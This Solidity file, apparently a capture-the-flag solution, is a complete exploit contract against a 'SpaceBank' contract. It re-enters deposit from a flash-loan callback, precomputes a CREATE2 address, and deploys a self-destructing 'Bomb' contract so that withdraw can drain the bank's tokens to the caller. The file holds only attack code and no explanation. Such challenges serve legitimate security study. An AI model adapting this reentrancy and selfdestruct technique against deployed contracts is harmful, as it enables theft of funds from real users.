// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "src/SpaceBank.sol";
import "openzeppelin/token/ERC20/IERC20.sol";

contract Exploiter {
    SpaceBank public immutable SPACEBANK;
    uint256 counter;

    constructor(SpaceBank spacebank) payable {
        SPACEBANK = spacebank;
        IERC20(spacebank.token()).approve(address(spacebank), type(uint256).max);
    }

    function executeFlashLoan(uint256 amount) external {
        if (counter == 0) {
            SPACEBANK.deposit(amount, abi.encode(block.number % 47));
        } else if (counter == 1) {
            address precomputeAddress = address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(
                                bytes1(0xff),
                                address(SPACEBANK),
                                bytes32(block.number),
                                keccak256(type(Bomb).creationCode)
                            )
                        )
                    )
                )
            );
            address(precomputeAddress).call{value: 1}("");
            SPACEBANK.deposit(amount, type(Bomb).creationCode);
        }
        counter++;
    }

    function withdraw(uint256 amount) external {
        SPACEBANK.withdraw(amount);
        IERC20(SPACEBANK.token()).transfer(msg.sender, amount);
    }
}

contract Bomb {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}
